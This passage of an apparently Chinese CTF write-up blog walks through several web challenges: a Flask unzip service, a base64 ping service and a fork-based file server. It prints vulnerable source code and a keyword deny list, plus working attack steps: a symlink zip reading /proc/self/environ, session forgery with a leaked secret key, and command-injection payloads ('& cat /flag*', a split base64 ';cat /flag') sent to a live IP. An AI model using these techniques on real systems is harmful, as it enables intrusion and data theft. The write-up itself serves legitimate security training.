class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;upload&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户名已存在&quot;</span></span><br><span class="line"></span><br><span class="line">        users[username] = &#123;<span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&quot;password&quot;</span>] == password:</span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">            session[<span class="string">&quot;role&quot;</span>] = users[username][<span class="string">&quot;role&quot;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;upload&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户名或密码错误&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;未选择文件&quot;</span></span><br><span class="line"></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder, filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题很明显需要进行<strong>session伪造</strong>，因此我们需要得到<code>secret_key</code>，正常情况下会在<code>/app/config/secret_key.py</code></p><p>同时也关注到<code>os.system(f&quot;unzip -o &#123;zip_path&#125; -d &#123;target_dir&#125;&quot;)</code>，这里有命令执行，而且输入参数<code>dirname</code>是<strong>admin可控</strong>的，这就给了<strong>命令拼接执行</strong>的可能了</p><p>然后，再关注总体功能，它实现了用户上传<strong>压缩包的在线解压</strong>，并且解压到<strong>随机目录</strong>或者<code>admin</code>指定的目录<br>这里，我们可以利用<strong>软链接实现任意文件读取</strong>(那为什么不直接读<code>flag</code>呢？因为它的文件名是<strong>flag-xxxx.txt</strong>，我们是不可能猜到的)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RAND=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&#x27;a-zA-Z0-9&#x27;</span> | <span class="built_in">head</span> -c 32)</span><br><span class="line">FLAG_FILE=<span class="string">&quot;/flag-<span class="variable">$RAND</span>.txt&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /proc/self/environ <span class="built_in">env</span></span><br><span class="line">zip --symlinks a.zip <span class="built_in">env</span></span><br></pre></td></tr></table></figure><p>但是，并没有读到<code>secret_key.py</code>，所以<strong>读环境变量</strong>即可<br><code>FLASK_SECRET_KEY=#mu0cw9F#7bBCoF!</code></p><p><code>cookie</code>可以用<a href="https://www.jwt.io/">这个网站</a>解一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install flask-unsign</span><br><span class="line">flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;test&#x27;&#125;&quot;</span> --secret <span class="string">&#x27;#mu0cw9F#7bBCoF!&#x27;</span></span><br></pre></td></tr></table></figure><p>得到<code>eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImN0ZiJ9.aMU3Hg.mFcpn_I-PZD0UTVj4JyWI_NV2HM</code>，可以<strong>伪造admin</strong></p><p>然后我们随便选一个压缩包<code>1.zip</code>指定解压目录，然后<strong>命令拼接</strong>把<code>flag</code><strong>重定向</strong>带出来</p><p><code>curl -X POST http://60.205.163.215:13699/upload -b &quot;session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImN0ZiJ9.aMU3Hg.mFcpn_I-PZD0UTVj4JyWI_NV2HM&quot; -F &quot;file=@1.zip&quot; -F &quot;dirname=1 &amp; cat /flag* &gt; /app/uploads/1/flag&quot;</code></p><p>在这里命令拼接<code>&amp;</code>和<code>|</code>都是可以的，一开始被<code>;</code>卡住了，换一个就好(?怎么感觉就我有问题，下次再也不用<code>ai</code>给的<code>curl</code>了x)</p><p>访问<code>http://60.205.163.215:13699/download/1</code>，下载<code>flag</code>皆可</p><h2 id="ping-补"><a href="#ping-补" class="headerlink" title="ping(补)"></a>ping(补)</h2><blockquote><p>是熟悉的ping</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(</span><br><span class="line">            command,</span><br><span class="line">            shell=<span class="literal">True</span>,</span><br><span class="line">            check=<span class="literal">True</span>,</span><br><span class="line">            capture_output=<span class="literal">True</span>,</span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> process.stdout</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ping&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    data = flask.request.json</span><br><span class="line">    ip_base64 = data.get(<span class="string">&#x27;ip_base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ip_base64:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;no ip&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    result = run_ping(ip_base64)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;output&#x27;</span>: result&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>感觉这题过滤得死死的，只能是<code>ip</code>的正常格式，长度也受限制，根本无从下手……</p><p>好奇怪，题目要求应该是输入<code>base64编码</code>，但我只能输<code>ip</code>，本地是这样，当时的远程好像也是这样。。。<br>后面发现了，直接在前端输会被<code>base64编码</code>，所以建议使用<code>hackbar</code>或者<code>yakit</code>等发包工具</p><p>重点关注<code>command = f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#39;&#123;ip_base64&#125;&#39; | base64 -d)&quot; | sh&quot;&quot;&quot;</code></p><p><code>ip_base64</code>是，先通过<strong>Python</strong>的<code>base64库</code>解码校验之后，再经过<strong>Linux</strong>的命令行解码，而在<strong>Python</strong>中是存在<a href="https://bugs.python.org/issue34832">Bug</a>的</p><p>我就说为什么要<strong>解两次码</strong>，原来是这样的</p><p><strong>base64.b64decode</strong>不会对<code>=</code>之后的内容继续解码，从而通过只能是<code>ip</code>格式的校验，而<code>base64 -d</code>会将编码从中间拆开<strong>分别解码再拼接</strong>，从而可以<strong>命令拼接执行</strong>，因此我们将两部分拆开即可<code>0.0.0.0</code> <code>;cat /flag</code><br><code>MC4wLjAuMA==</code> <code>O2NhdCAvZmxhZw==</code></p><p>然后拼接<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /ping</span><br><span class="line"></span><br><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;ip_base64&#x27;<span class="punctuation">:</span> &#x27;MC4wLjAuMA==O2NhdCAvZmxhZw==&#x27;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"># flag<span class="punctuation">&#123;</span>bAse64_15_DIffER3N7_IN_LInUX_anD_pytH0N_i9a7m<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p><p>好玩！</p><h2 id="Peek-a-Fork-补"><a href="#Peek-a-Fork-补" class="headerlink" title="Peek a Fork(补)"></a>Peek a Fork(补)</h2><blockquote><p>伪HTTP解析器</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> fcntl</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">mm = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(flag))</span><br><span class="line">mm.write(flag)</span><br><span class="line">os.remove(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FORBIDDEN = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;proc&#x27;</span>, <span class="string">b&#x27;&lt;&#x27;</span>, <span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;^&#x27;</span>, <span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&#x27;&quot;&#x27;</span>, <span class="string">b&#x27;..&#x27;</span>, <span class="string">b&#x27;./&#x27;</span>]</span><br><span class="line">PAGE = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Secure Gateway&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">        body &#123; font-family: &#x27;Courier New&#x27;, monospace; background-color: #0c0c0c; color: #00ff00; text-align: center; margin-top: 10%; &#125;</span></span><br><span class="line"><span class="string">        .container &#123; border: 1px solid #00ff00; padding: 2rem; display: inline-block; &#125;</span></span><br><span class="line"><span class="string">        h1 &#123; font-size: 2.5rem; text-shadow: 0 0 5px #00ff00; &#125;</span></span><br><span class="line"><span class="string">        p &#123; font-size: 1.2rem; &#125;</span></span><br><span class="line"><span class="string">        .status &#123; color: #ffff00; &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Firewall&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=&quot;status&quot;&gt;STATUS: All systems operational.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Your connection has been inspected.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">conn, addr, log, factor=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn.settimeout(<span class="number">10.0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> log:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                fcntl.flock(f, fcntl.LOCK_EX)</span><br><span class="line">                log_bytes = <span class="string">f&quot;<span class="subst">&#123;addr[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;<span class="built_in">str</span>(addr[<span class="number">1</span>])&#125;</span>:<span class="subst">&#123;<span class="built_in">str</span>(conn)&#125;</span>&quot;</span>.encode()</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(factor):</span><br><span class="line">                    log_bytes = hashlib.sha3_256(log_bytes).digest()</span><br><span class="line">                log_entry = log_bytes.<span class="built_in">hex</span>() + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                f.write(log_entry)</span><br><span class="line">                </span><br><span class="line">        request_data = conn.recv(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_data.startswith(<span class="string">b&quot;GET /&quot;</span>):</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line">            </span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            length = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, path)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">                </span><br><span class="line">                clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">                filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">            response_body = PAGE</span><br><span class="line">            response_status = <span class="string">&quot;200 OK&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.normpath(filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">if</span> offset &gt; <span class="number">0</span>:</span><br><span class="line">                        f.seek(offset)</span><br><span class="line">                    </span><br><span class="line">                    data_bytes = f.read(length)</span><br><span class="line">                    response_body = data_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                response_status = <span class="string">&quot;200 OK&quot;</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                response_body = <span class="string">f&quot;Invalid path&quot;</span></span><br><span class="line">                response_status = <span class="string">&quot;500 Internal Server Error&quot;</span></span><br><span class="line"></span><br><span class="line">        response = <span class="string">f&quot;HTTP/1.1 <span class="subst">&#123;response_status&#125;</span>\r\nContent-Length: <span class="subst">&#123;<span class="built_in">len</span>(response_body)&#125;</span>\r\n\r\n<span class="subst">&#123;response_body&#125;</span>&quot;</span></span><br><span class="line">        conn.sendall(response.encode())</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line">        os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">    server.listen(<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Server listening on port 1337...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pid, status = os.waitpid(-<span class="number">1</span>, os.WNOHANG)</span><br><span class="line">        <span class="keyword">except</span> ChildProcessError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        conn, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        initial_data = conn.recv(<span class="number">256</span>, socket.MSG_PEEK)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(term <span class="keyword">in</span> initial_data.lower() <span class="keyword">for</span> term <span class="keyword">in</span> FORBIDDEN):</span><br><span class="line">            conn.sendall(<span class="string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> initial_data.startswith(<span class="string">b&#x27;GET /?log=1&#x27;</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                factor = <span class="number">1</span></span><br><span class="line">                pattern = <span class="string">rb&quot;&amp;factor=(\d+)&quot;</span></span><br><span class="line">                <span class="keyword">match</span> = re.search(pattern, initial_data)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    factor = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                pid = os.fork()</span><br><span class="line">                <span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">                    server.close()</span><br><span class="line">                    handle_connection(conn, addr, <span class="literal">True</span>, factor)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[ERROR]: &quot;</span>, e)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pid = os.fork()</span><br><span class="line">            <span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">                server.close()</span><br><span class="line">                handle_connection(conn, addr, <span class="literal">False</span>)</span><br><span class="line">        </span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这题把<code>flag</code>丢<strong>内存</strong>里面了，既然如此，肯定是要读<code>/proc/self/mem</code>，但得先读<code>maps</code>(内存映射)，因为<code>mem</code>里面有些内容我们是没有权限读的</p><p><strong>WAF</strong>: <code>FORBIDDEN = [b&#39;flag&#39;, b&#39;proc&#39;, b&#39;&lt;&#39;, b&#39;&gt;&#39;, b&#39;^&#39;, b&quot;&#39;&quot;, b&#39;&quot;&#39;, b&#39;..&#39;, b&#39;./&#39;]</code></p><p>先看总体功能，该<strong>伪HTTP解析器</strong>，实现了任意文件读取的功能，同时还可以通过<code>url</code>参数<code>offset</code>和<code>length</code>读取文件的特定部分，并且还有一个日志记录功能<code>/?log=1</code></p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">length = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span 